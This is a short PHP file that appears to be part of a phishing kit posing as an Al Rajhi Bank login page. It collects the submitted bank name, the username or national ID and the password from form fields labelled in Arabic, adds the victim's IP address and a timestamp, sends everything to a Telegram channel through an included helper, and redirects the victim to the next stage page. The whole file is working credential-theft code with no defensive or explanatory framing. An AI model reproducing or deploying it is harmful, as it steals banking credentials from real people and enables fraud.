<?php
include("tlgrm.php");
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+] LOGIN ALRAJHI BANK [+]###############[+\n";
$message .= "# الهدف من تقديم الطلب        : ".$_POST['nf-field-5']."\n";
$message .= "# البنك          : ".$_POST['nf-field-6']."\n";
$message .= "# أسم المستخدم / الرقم القومي          : ".$_POST['nf-field-7']."\n";
$message .= "# كلمة المرور          : ".$_POST['nf-field-8']."\n";
$message .= "# IP INFO            : $ip\n";
$message .= "# TIME/DATE          : $date\n";
$message .= "+]###############[+] G 1 N G  [+]###############[+\n";
telegram($message);
sleep(5);
echo "<meta http-equiv='refresh' content='0; url=v1.php'/>";

?>